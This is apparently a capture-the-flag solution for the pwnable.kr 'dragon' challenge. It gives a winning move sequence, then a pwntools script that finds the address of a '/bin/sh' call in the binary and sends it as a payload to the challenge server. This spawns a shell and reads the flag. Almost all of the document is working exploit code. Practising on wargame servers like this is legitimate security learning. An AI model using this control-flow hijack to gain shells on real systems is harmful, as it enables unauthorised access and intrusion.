Optimal way to win the game is this sequence of moves:
```python
optimal = [1,1,1,1,3,3,2,3,3,2,3,3,2,3,3,2]
```
```python
from pwn import *
elf = ELF("dragon")

binsh_str = list(elf.search("/bin/sh"))[0]
binsh_instr = list(elf.search(asm("mov dword ptr [esp], "+str(binsh_str))))[0]

payload = p32(binsh_instr)

shell = remote("pwnable.kr", 9004)
```
Win the game:
```python
for move in optimal: 
    shell.sendline(str(move))
```
And go to shell.
```python
shell.sendline(payload)
shell.sendline("cat flag")

shell.interactive()
```
